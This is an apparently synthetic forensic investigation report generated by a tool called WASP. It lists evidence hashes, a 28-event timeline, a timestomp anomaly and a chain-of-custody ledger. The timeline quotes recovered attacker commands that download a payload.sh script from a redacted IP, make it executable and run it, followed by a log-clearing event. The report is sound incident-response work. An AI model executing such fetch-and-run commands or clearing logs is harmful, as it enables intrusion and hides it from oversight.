# WASP Investigation Report — CASE-2026-LIVE

**Lead Examiner:** Alex Mercer (Senior Forensics Examiner)  
**Organization:** Cyber Incident Response Unit  
**Authorization Reference:** WARRANT-2026-0881  
**Schema Version:** 2.0.0 | **Tool Version:** 1.4.0  

---

## 1. Executive Summary & PS Objectives Matrix

| # | Objective | Status | Findings |
|---|---|---|---|
| 1 | **File metadata extraction** | COMPLETED | Extracted filesystem stats, OOXML properties, PDF metadata, ZIP entries. |
| 2 | **System artefact extraction** | COMPLETED | Extracted MFT, registry hives, EVTX event logs, Prefetch, LNK shortcuts, browser history. |
| 3 | **Timestamp extraction** | COMPLETED | Decoded multi-epoch timestamps normalized to UTC with explainable confidence. |
| 4 | **Chronological timeline reconstruction** | COMPLETED | Generated single normalized super-timeline with 28 records. |
| 5 | **SHA-256 evidence integrity** | VERIFIED | Mandatory SHA-256 computed; custody ledger replayed; Merkle root: `1f391b61693c7b2b09351f374b6d5df4ace8b03f1b34d866e1d76000262cf4f6`. |
| 6 | **Structured investigation reports** | COMPLETED | Compiled multi-format reports with provenance, integrity block, and privacy redaction. |

---

## 2. Digital Evidence Inventory (SHA-256 Hashes)

| Evidence ID | Path | Container | Size (Bytes) | SHA-256 Hash | Status |
|---|---|---|---|---|---|

| `EV-AUTH.L` | `evidence/auth.log` | raw | 283 | `b544dfd8cc0d4521f4ba801cd4b9215ef76b6a5f76149038b6171cd664e095e4` | MATCH |

| `EV-BASH_H` | `evidence/bash_history` | raw | 112 | `a45c0410ad9fea5a6fec7056a904d518673c2e1950f124d9383dbdcfbfbdf554` | MATCH |

| `EV-EXFILT` | `evidence/exfiltrated_files.zip` | raw | 317 | `20d3a642704a96afe13659bd6cbd6c23a5e0035d643ece9cd2914dde158c2d7f` | MATCH |

| `EV-HISTOR` | `evidence/History` | raw | 8192 | `ddeee48ddcd3e8fd4b88dbe62d5624d7e71983919f0a12ceb3f79844e2322b95` | MATCH |

| `EV-INVEST` | `evidence/investigation_memo.docx` | raw | 813 | `2cd52c328126cbce12337a0f94ae1f9037b63ec6f7f6118f9b13fe2198b1cca1` | MATCH |

| `EV-SECURI` | `evidence/Security_Events.jsonl` | raw | 503 | `15957efb2f1573f54296ac349387196a60825acb65518ab856a5179afe1e8ad0` | MATCH |


---




## 4. Cross-Source Corroboration & Anti-Forensics Analysis

- **Corroborated Activity Clusters:** 0
- **Corroborated Events Count:** 0
- **Anti-Forensics / Conflicts Detected:** 1


### Anti-Forensic Anomalies & Timestomp Conflicts
| Severity | Entity | Anomaly Type | Description |
|---|---|---|---|

| **MEDIUM** | `investigation_memo.docx` | `MODIFIED_PRE_CREATION` | Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T20:05:47.522842+00:00 |





---


## 5. Reconstructed Chronological Activity Timeline (Excerpt)

| UTC Timestamp | Action | User | Object / Target | Source Artefact | Corroborated By | Conf. | Rationale |
|---|---|---|---|---|---|---|---|

| `2024-03-10T14:30:00+00:00` | `FILE_CREATE` | [USER_001] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:created metadata |

| `2024-03-10T20:50:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://github.com/malicious/repo` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-10T21:00:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://pastebin.com/raw/d849fa` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-11T01:50:00+00:00` | `FILE_WRITE` | [USER_002] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:modified metadata (⚠️ Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T20:05:47.522842+00:00) |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4624 |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:15:00+00:00` | `PROCESS_START` | UNKNOWN | `wget http://[IP_004]/payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:15:30+00:00` | `FILE_ACCESS` | UNKNOWN | `sudo` | Linux:sudo:evidence/auth.log | `-` | 0.85 | Syslog entry for sudo (assumed year 2024) |

| `2024-03-11T02:16:00+00:00` | `PROCESS_START` | UNKNOWN | `chmod +x payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:16:15+00:00` | `PROCESS_START` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4688 |

| `2024-03-11T02:17:00+00:00` | `PROCESS_START` | UNKNOWN | `./payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:17:30+00:00` | `SERVICE_INSTALL` | UNKNOWN | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 7045 |

| `2024-03-11T02:18:45+00:00` | `FILE_ACCESS` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:20:00+00:00` | `LOG_CLEARED` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 1102 |

| `2026-10-05T20:05:43.474778+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T20:05:43.479778+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T20:05:43.484778+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T20:05:43.512279+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T20:05:43.526046+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T20:05:43.539087+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-05T20:05:43.652646+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T20:05:44.774879+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T20:05:45.670620+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T20:05:46.613605+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T20:05:47.522842+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-05T20:05:48.469385+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-06T01:35:42+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::passwords.txt` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |

| `2026-10-06T01:35:42+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::financial_report.pdf` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |


*(Total reconstructed timeline events: 28)*

---

## 6. Cryptographic Integrity & Attestation

- **Overall Integrity Check:** `PASS`
- **Custody Ledger Replay:** `PASS` (15 entries verified)
- **Derived Files Status:** `PASS`
- **Merkle Root Digest:** `1f391b61693c7b2b09351f374b6d5df4ace8b03f1b34d866e1d76000262cf4f6`

---

## 7. Chain of Custody Audit Log

| Seq | Timestamp (UTC) | Actor | Event Type | Prev Hash | Entry Hash |
|---|---|---|---|---|---|

| 1 | `2026-10-05T20:05:43.552552+00:00` | Alex Mercer (Senior Forensics Examiner) | `case_created` | `000000000000...` | `b0f6f15e46ec...` |

| 2 | `2026-10-05T20:05:44.758483+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `b0f6f15e46ec...` | `80d41de578c8...` |

| 3 | `2026-10-05T20:05:45.657539+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `80d41de578c8...` | `2aaffeaf70a1...` |

| 4 | `2026-10-05T20:05:46.592511+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `2aaffeaf70a1...` | `56e2b0237c01...` |

| 5 | `2026-10-05T20:05:47.503661+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `56e2b0237c01...` | `01454161025e...` |

| 6 | `2026-10-05T20:05:48.447329+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `01454161025e...` | `2268f1ab0b13...` |

| 7 | `2026-10-05T20:05:49.347514+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `2268f1ab0b13...` | `75d81f6e6aff...` |

| 8 | `2026-10-05T20:05:49.463608+00:00` | Alex Mercer (Senior Forensics Examiner) | `artefacts_extracted` | `75d81f6e6aff...` | `4ae9c6b0fe46...` |

| 9 | `2026-10-05T20:05:49.711219+00:00` | Alex Mercer (Senior Forensics Examiner) | `cross_source_corroborated` | `4ae9c6b0fe46...` | `f741eadec7ad...` |

| 10 | `2026-10-05T20:05:49.734657+00:00` | Alex Mercer (Senior Forensics Examiner) | `threat_rules_scanned` | `f741eadec7ad...` | `c49dc25ba4f1...` |

| 11 | `2026-10-05T20:05:50.428396+00:00` | Alex Mercer (Senior Forensics Examiner) | `timeline_built` | `c49dc25ba4f1...` | `e46a48b5a726...` |

| 12 | `2026-10-05T20:05:50.486584+00:00` | Alex Mercer (Senior Forensics Examiner) | `process_lineage_reconstructed` | `e46a48b5a726...` | `70a408a69b9e...` |

| 13 | `2026-10-05T20:05:50.539536+00:00` | Alex Mercer (Senior Forensics Examiner) | `anomalies_detected` | `70a408a69b9e...` | `19fce83b1ae5...` |

| 14 | `2026-10-05T20:05:50.584182+00:00` | Alex Mercer (Senior Forensics Examiner) | `sigma_rules_evaluated` | `19fce83b1ae5...` | `bd29d1c1349f...` |

| 15 | `2026-10-05T20:05:50.709632+00:00` | Alex Mercer (Senior Forensics Examiner) | `integrity_verified` | `bd29d1c1349f...` | `1cb02e271d2d...` |


---
*Generated automatically by WASP v1.4.0.*
